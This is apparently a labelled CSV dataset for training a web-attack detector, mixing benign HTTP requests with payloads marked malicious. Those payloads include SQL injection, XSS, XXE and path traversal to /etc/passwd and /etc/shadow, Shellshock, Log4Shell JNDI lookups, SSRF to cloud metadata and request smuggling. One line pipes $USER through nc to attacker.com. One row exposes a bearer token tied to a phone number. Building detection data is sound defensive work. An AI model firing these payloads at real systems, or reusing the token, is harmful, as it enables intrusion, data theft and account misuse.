method,path,query,headers,body,ua,label
GET,/,,GET /search?q=security,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,{{7*7}} or {{config.items()}},,,1
PUT,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,`uname -a`,,,1
GET,/,,GET /user/profile,,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /settings/security,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/favicon.ico,,,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,id=1&id=2,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,${os.system('id')},,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,../../../../etc/passwd%00,,,1
POST,/products,id=123,Host: example.com; Accept: */*,username=user461&password=pass719,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,id=1&id=2,,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/debug.cgi,,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Cookie: () { ignored; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd; Host: nagios.vnpay.vn; Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd; Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
POST,/web-api/orders/260209PFFEDYHMT/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzc0NDcyNjMiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZDgwMGM2ZjEtOTk2NC00ODg4LTllYmQtMmFiZmNlMDBkNjk1IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzc0NDcyNjMiLCJzdWIiOiJXRUJTSVRFQDA3Nzc0NDcyNjMiLCJpYXQiOjE3NzA2MzAyODYsImV4cCI6MTc3MTIzNTA4Nn0.0qQCRrTEeSDXjY62kNjiu1roG11gSLzM4PUnmGVnPII; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 22cedb5b-e574-468b-ae28-6300c5b7f0d7",,python-requests/2.32.5,0
GET,/,,GET /blog/future-of-ai-2026,,,0
PUT,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,portgw=80089948;%20alert(document.domain),"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
PUT,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/index.php,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,GET /search?q=security,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,|| ls -la,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
DELETE,/admin,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",sqlmap/1.5.2,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,${os.system('id')},,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /manifest.json,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,%0als,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",sqlmap/1.5.2,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,GET /auth/logout/confirm,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user650&password=pass680,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
DELETE,/search,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nmap Scripting Engine,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /settings/security,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,GET /login,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,`uname -a`,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1&id=2,,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /sitemap.xml,,,0
GET,/favicon.ico,,,,,0
GET,/,,expect://id,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/ipecs-cm/download,filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",1
GET,/favicon.ico,,,,,0
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/login (username/password),,,0
